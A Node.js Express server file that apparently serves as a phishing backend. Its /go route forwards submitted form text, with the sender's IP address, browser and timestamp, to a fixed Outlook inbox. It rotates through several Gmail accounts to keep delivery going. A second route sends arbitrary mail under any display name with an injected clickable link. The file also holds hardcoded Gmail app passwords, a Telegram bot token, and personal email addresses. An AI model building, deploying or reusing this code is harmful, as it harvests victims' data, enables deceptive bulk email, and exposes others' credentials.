import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import TelegramBot from "node-telegram-bot-api";
import axios from "axios";
import fetch from "node-fetch";

const app = express();
const port = 3001;

// Middleware to parse JSON requests
app.use(cors());
app.use(bodyParser.json());

// CORS Headers for iOS compatibility
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Gmail accounts and their app passwords
const gmailAccounts = [
  //{ user: "serenetides01@gmail.com", pass: "fgta ophs ewdn gfum" },
  { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },
  { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
  { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
  { user: "richard.weeks1945@gmail.com", pass: "ukrt wbph qizo ticu" },
];

// Telegram Bot setup
const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c";
const telegramBot = new TelegramBot(telegramToken);
const chatId = "5640521477"; // Replace with your chat ID
const webhookUrl = "https://api-gamma-neon.vercel.app/telegram-webhook"; // Replace with your actual webhook URL

// Set Telegram webhook
const setWebhook = async () => {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${telegramToken}/setWebhook`,
      { url: webhookUrl }
    );
    console.log("Webhook set successfully:", response.data);
  } catch (error) {
    console.error("Error setting webhook:", error.message);
  }
};
setWebhook();

app.get("/", (req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Welcome to my simple API");
});

const shuffleArray = (array) => {
  return array.sort(() => Math.random() - 0.5);
};

// Modified sendEmailWithRotation function
const sendEmailWithRotation = (req, subject, message, callback) => {
  let attempt = 0;
  const shuffledAccounts = shuffleArray([...gmailAccounts]); // Randomize accounts

  const tryNextAccount = () => {
    if (attempt >= shuffledAccounts.length) {
      console.log("All Gmail accounts have been tried, email sending failed.");
      return callback("Failed to send email", null);
    }

    const { user, pass } = shuffledAccounts[attempt];
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: { user, pass },
    });

    const ipAddress = req.ip;
    const userAgent = req.headers["user-agent"];
    const timestamp = new Date().toISOString();

    const fullMessage = `
      ${message}
      <br><br>=======================
      <br><strong>Additional Information</strong>
      <br>=======================
      <br><strong>IP Address:</strong> ${ipAddress}
      <br><strong>Browser:</strong> ${userAgent}
      <br><strong>Timestamp:</strong> ${timestamp}
      <br><em>Good luck!</em>
    `;

    const mailOptions = {
      from: user,
      to: "hey.heatherw@outlook.com",
      subject: subject,
      text: fullMessage.replace(/<br>/g, "\n"), // Convert HTML to plain text for email
      html: fullMessage, // Use HTML format
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(`Failed to send email with ${user}:`, error.message);
        attempt++;
        tryNextAccount();
      } else {
        console.log(`Email successfully sent using ${user}.`);
        callback(null, { message: "Success", info });
      }
    });
  };

  tryNextAccount();
};



app.get("/location", async (req, res) => {
  const response = await fetch("http://ip-api.com/json/");
  const data = await response.json();
  res.json(data);
});

app.post("/go", (req, res) => {
  const { subject, message } = req.body;

  if (!subject || !message) {
    console.error("Missing subject or message in request body.");
    return res.status(400).json({ error: "All fields are required" });
  }

  sendEmailWithRotation(req, subject, message, (error, result) => {
    if (error) {
      console.error("Error occurred:", error);
      return res.status(500).json({ error });
    }
    res.status(200).json(result);
  });
});

// New route: Sends email without Telegram integration but includes all additional info
app.post("/gowt", (req, res) => {
  const { subject, message, from, to, format, linkText, linkUrl, textColor, fontSize } = req.body;

  if (!subject || !message) {
    console.log("Request validation failed. Missing subject or message.");
    return res.status(400).json({ error: "All fields are required" });
  }

  console.log("Received request to send email.");

  let attempt = 0;

  const tryNextAccount = () => {
    if (attempt >= gmailAccounts.length) {
      console.log("All Gmail accounts have been tried, email sending failed.");
      return res
        .status(500)
        .json({ error: "Failed to send email with all accounts" });
    }

    const { user, pass } = gmailAccounts[attempt];
    console.log(`Attempting to send email with: ${user}`);

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user,
        pass,
      },
    });

    const safeTextColor = textColor || "#000000"; // Default link color
    const safeFontSize = fontSize || "14px"; // Default font size

    // Convert message to HTML with specified font size
    let htmlMessage = `
      <div style="font-size: ${safeFontSize}; color: #000;">
        ${message.replace(/\n/g, "<br>")}
      </div>
    `;

    // Replace the specified text with a bold, clickable hyperlink
    htmlMessage = htmlMessage.replace(
      linkText,
      `<a href="${linkUrl}" target="_blank" style="color: ${safeTextColor}; font-weight: bold; text-decoration: none;">${linkText}</a>`
    );

    const mailOptions = {
      from: `${from}<${user}>` || user,
      to: to || "hey.heatherw@outlook.com",
      subject: subject,
      text: format === "html" ? undefined : message, // Plain text fallback
      html: format === "html" ? htmlMessage : undefined, // Styled HTML email content
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(`Failed to send email with ${user}:`, error);
        attempt++;
        tryNextAccount();
      } else {
        console.log(`Email successfully sent using ${user}.`);
        res.status(200).json({ message: "Email sent successfully", info });
      }
    });
  };

  tryNextAccount();
});


app.post("/telegram-webhook", (req, res) => {
  console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));

  if (req.body && req.body.message) {
    const chatId = req.body.message.chat.id;
    const text = req.body.message.text;

    console.log("Received message:", text);

    telegramBot
      .sendMessage(chatId, `You said: ${text}`)
      .then(() => console.log("Message sent successfully."))
      .catch((err) =>
        console.error("Failed to send Telegram message:", err.message)
      );
  }

  res.status(200).send("OK");
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
